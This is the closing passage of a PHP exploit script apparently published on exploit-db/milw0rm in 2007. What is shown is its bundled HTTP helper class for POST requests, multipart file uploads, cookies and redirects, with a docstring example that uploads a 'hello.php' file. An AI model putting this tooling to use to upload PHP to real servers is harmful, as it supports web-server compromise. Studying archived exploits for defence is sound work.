$this->sock();\r\n\t}\r\n\r\n\t\r\n\t/**\r\n\t * This function sends the formed http packet with the\r\n\t * POST method. You can precise the port of the host.\r\n\t * \r\n\t * $this->post(\"http://localhost/index.php\",\"admin=1&user=dark\");\r\n\t *\r\n\t * @param string $urlwithpath\r\n\t * @param string $postdata\r\n\t * @return $server_response\r\n\t */\t\r\n\tpublic function post($url,$data)\r\n\t{\r\n\t\t$this->target($url);\r\n\t\t$this->method=\"post\";\r\n\t\t$this->data=$data;\r\n\t\treturn $this->sock();\r\n\t}\r\n\t\r\n\r\n\t/**\r\n\t * This function sends the formed http packet with the\r\n\t * POST method using the multipart/form-data enctype. \r\n\t * \r\n\t * $array = array(\r\n\t *          frmdt_url      => \"http://localhost/upload.php\",\r\n\t *          frmdt_boundary => \"123456\",                    # Optional\r\n\t *                 \"email\" => \"me@u.com\",\r\n\t *               \"varname\" => array(\r\n\t *                            frmdt_type => \"image/gif\",   # Optional\r\n\t *                       frmdt_transfert => \"binary\",      # Optional\r\n\t *                        frmdt_filename => \"hello.php\",\r\n\t *                         frmdt_content => \"<?php echo ':)'; ?>\"));\r\n\t * $this->formdata($array);\r\n\t *\r\n\t * @param array $array\r\n\t * @return $server_response\r\n\t */\r\n\tpublic function formdata($array)\r\n\t{\r\n\t\t$this->target($array[frmdt_url]);\r\n\t\t$this->method=\"formdata\";\r\n\t\t$this->data='';\r\n\t\tif(!isset($array[frmdt_boundary])) $this->boundary=\"phpsploit\";\r\n\t\telse $this->boundary=$array[frmdt_boundary];\r\n\t\tforeach($array as $key => $value)\r\n\t\t{\r\n\t\t\tif(!preg_match(\"#^frmdt_(boundary|url)#\",$key))\r\n\t\t\t{\r\n\t\t\t\t$this->data .= \"-----------------------------\".$this->boundary.\"\\r\\n\";\r\n\t\t\t\t$this->data .= \"Content-Disposition: form-data; name=\\\"\".$key.\"\\\";\";\r\n\t\t\t\tif(!is_array($value))\r\n\t\t\t\t{\r\n\t\t\t\t\t$this->data .= \"\\r\\n\\r\\n\".$value.\"\\r\\n\";\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\t$this->data .= \" filename=\\\"\".$array[$key][frmdt_filename].\"\\\";\\r\\n\";\r\n\t\t\t\t\tif(isset($array[$key][frmdt_type])) $this->data .= \"Content-Type: \".$array[$key][frmdt_type].\"\\r\\n\";\r\n\t\t\t\t\tif(isset($array[$key][frmdt_transfert])) $this->data .= \"Content-Transfer-Encoding: \".$array[$key][frmdt_transfert].\"\\r\\n\";\r\n\t\t\t\t\t$this->data .= \"\\r\\n\".$array[$key][frmdt_content].\"\\r\\n\";\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\t$this->data .= \"-----------------------------\".$this->boundary.\"--\\r\\n\";\r\n\t\treturn $this->sock();\r\n\t}\r\n\r\n\t\r\n\t/**\r\n\t * This function returns the content of the server response\r\n\t * without the headers.\r\n\t * \r\n\t * $this->getcontent($this->get(\"http://localhost/\"));\r\n\t * or\r\n\t * $this->getcontent();\r\n\t *\r\n\t * @param string $server_response\r\n\t * @return $onlythecontent\r\n\t */\r\n\tpublic function getcontent($code='')\r\n\t{\r\n\t\tif(empty($code)) $code = $this->recv;\r\n\t\t$content = explode(\"\\n\",$code);\r\n\t\t$onlycode = '';\r\n\t\tfor($i=1;$i<count($content);$i++)\r\n\t\t{\r\n\t\t\tif(!preg_match(\"/^(\\S*):/\",$content[$i])) $ok = 1;\r\n\t\t\tif($ok) $onlycode .= $content[$i].\"\\n\";\r\n\t\t}\r\n\t\treturn $onlycode;\r\n\t}\r\n\r\n\t\r\n\t/**\r\n\t * This function returns the headers of the server response\r\n\t * without the content.\r\n\t * \r\n\t * $this->getheader($this->post(\"http://localhost/x.php\",\"x=1&z=2\"));\r\n\t * or\r\n\t * $this->getheader();\r\n\t *\r\n\t * @param string $server_response\r\n\t * @return $onlytheheaders\r\n\t */\r\n\tpublic function getheader($code='')\r\n\t{\r\n\t\tif(empty($code)) $code = $this->recv;\r\n\t\t$header = explode(\"\\n\",$code);\r\n\t\t$onlyheader = $header[0].\"\\n\";\r\n\t\tfor($i=1;$i<count($header);$i++)\r\n\t\t{\r\n\t\t\tif(!preg_match(\"/^(\\S*):/\",$header[$i])) break;\r\n\t\t\t$onlyheader .= $header[$i].\"\\n\";\r\n\t\t}\r\n\t\treturn $onlyheader;\r\n\t}\r\n\r\n\t\r\n\t/**\r\n\t * This function is called by the cookiejar() function.\r\n\t * It adds the value of the \"Set-Cookie\" header in the \"Cookie\"\r\n\t * header for the next request. You don't have to call it.\r\n\t * \r\n\t * @param string $server_response\r\n\t */\r\n\tprivate function getcookie($code)\r\n\t{\r\n\t\t$carr = explode(\"\\n\",str_replace(\"\\r\\n\",\"\\n\",$code));\r\n\t\tfor($z=0;$z<count($carr);$z++)\r\n\t\t{\r\n\t\t\tif(preg_match(\"/set-cookie: (.*)/i\",$carr[$z],$cookarr))\r\n\t\t\t{\r\n\t\t\t\t$cookie[] = preg_replace(\"/expires=(.*)(GMT||UTC)(\\S*)$/i\",\"\",preg_replace(\"/path=(.*)/i\",\"\",$cookarr[1]));\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tfor($i=0;$i<count($cookie);$i++)\r\n\t\t{\r\n\t\t\tpreg_match(\"/(\\S*)=(\\S*)(|;)/\",$cookie[$i],$matches);\r\n\t    \t        $cookn = $matches[1];\r\n\t    \t        $cookv = $matches[2];\r\n\t    \t        $this->addcookie($cookn,$cookv);\r\n\t\t}\r\n    }\r\n\r\n\t\r\n\t/**\r\n\t * This function is called by the get()/post() functions.\r\n\t * You don't have to call it.\r\n\t *\r\n\t * @param string $urltarg\r\n\t */\r\n\tprivate function target($urltarg)\r\n\t{\r\n\t\tif(!preg_match(\"/^http:\\/\\/(.*)\\//\",$urltarg)) $urltarg .= \"/\";\r\n\t\t$this->url=$urltarg;\r\n\t\t\r\n\t\t$array = explode(\"/\",str_replace(\"http://\",\"\",preg_replace(\"/:(\\d+)/\",\"\",$urltarg)));\r\n\t\t$this->host=$array[0];\r\n\r\n\t\tpreg_match(\"/:(\\d+)\\//\",$urltarg,$matches);\r\n\t\t$this->port=empty($matches[1]) ? 80 : $matches[1];\r\n\t\t\r\n\t\t$temp = str_replace(\"http://\",\"\",preg_replace(\"/:(\\d+)/\",\"\",$urltarg));\r\n\t\tpreg_match(\"/\\/(.*)\\//\",$temp,$matches);\r\n\t\t$this->path=str_replace(\"//\",\"/\",\"/\".$matches[1].\"/\");\r\n\t\r\n\t\tif($this->port > 65535) die(\"Error: Invalid port number\");\r\n\t}\r\n\t\r\n\t\r\n\t/**\r\n\t * If you call this function, the script will\r\n\t * extract all \"Set-Cookie\" headers values\r\n\t * and it will automatically add them into the \"Cookie\" header\r\n\t * for all next requests.\r\n\t *\r\n\t * $this->cookiejar(1); // enabled\r\n\t * $this->cookiejar(0); // disabled\r\n\t * \r\n\t */\r\n\tpublic function cookiejar($code)\r\n\t{\r\n\t\tif($code===0) $this->cookiejar='';\r\n\t\tif($code===1) $this->cookiejar=1;\r\n\t\telse\r\n\t\t{\r\n\t\t\t$this->getcookie($code);\r\n\t\t}\r\n\t}\r\n\r\n\r\n\t/**\r\n\t * If you call this function, the script will\r\n\t * follow all redirections sent by the server.\r\n\t * \r\n\t * $this->allowredirection(1); // enabled\r\n\t * $this->allowredirection(0); // disabled\r\n\t * \r\n\t * @return $this->get($locationresponse)\r\n\t */\r\n\tpublic function allowredirection($code)\r\n\t{\r\n\t\tif($code===0) $this->allowredirection='';\r\n\t\tif($code===1) $this->allowredirection=1;\r\n\t\telse\r\n\t\t{\r\n\t\t\tif(preg_match(\"/(location|content-location|uri): (.*)/i\",$code,$codearr))\r\n\t\t\t{\r\n\t\t\t\t$location = str_replace(chr(13),'',$codearr[2]);\r\n\t\t\t\tif(!eregi(\"://\",$location))\r\n\t\t\t\t{\r\n\t\t\t\t\treturn $this->get(\"http://\".$this->host.$this->path.$location);\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\treturn $this->get($location);\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\treturn $code;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\t\r\n\t\r\n\t/**\r\n\t * This function allows you to reset some parameters:\r\n\t * \r\n\t * $this->reset(header); // headers cleaned\r\n\t * $this->reset(cookie); // cookies cleaned\r\n\t * $this->reset();       // clean all parameters\r\n\t *\r\n\t * @param string $func\r\n\t */\r\n\tpublic function reset($func='')\r\n\t{\r\n\t\tswitch($func)\r\n\t\t{\r\n\t\t\tcase \"header\":\r\n\t\t\t$this->header='';\r\n\t\t\tbreak;\r\n\t\t\t\r\n\t\t\tcase \"cookie\":\r\n\t\t\t$this->cookie='';\r\n\t\t\tbreak;\r\n\t\t\t\r\n\t\t\tdefault:\r\n\t\t        $this->cookiejar='';\r\n\t\t        $this->header='';\r\n\t\t        $this->cookie='';\r\n\t\t        $this->allowredirection=''; \r\n\t\t        $this->agent='';\r\n\t\t        break;\r\n\t\t}\r\n\t}\r\n}\r\n?>\r\n\r\n# milw0rm.com [2007-04-11]",
  "url": "https://www.exploit-db.com/exploits/3710"
}